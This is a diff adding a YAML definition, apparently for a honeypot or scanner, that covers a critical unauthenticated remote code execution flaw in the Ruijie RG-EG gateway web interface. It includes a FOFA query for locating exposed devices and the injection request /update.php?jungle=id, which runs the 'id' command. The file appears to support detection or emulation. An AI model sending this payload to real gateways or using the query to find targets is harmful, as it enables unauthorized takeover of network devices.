@@ -1,0 +1,36 @@
+id: ruijie-rg-eg-web-mis-rce
+info:
+  name: Ruijie RG-EG - Remote Code Execution
+  author: DhiyaneshDk
+  description: 'Ruijie RG-EG easy gateway WEB management system front-end RCE has
+    a command execution vulnerability. An attacker without identity authentication
+    can execute arbitrary commands to control server permissions.
+
+    '
+  severity: critical
+  reference:
+  - https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_WEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="请输入您的RG-EG易网关的用户名和密码"
+  tags: ruijie,router,iot,rce
+traps:
+- request:
+    method: GET
+    path: ''
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ruijie
+- request:
+    method: GET
+    path: /update.php?jungle=id
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
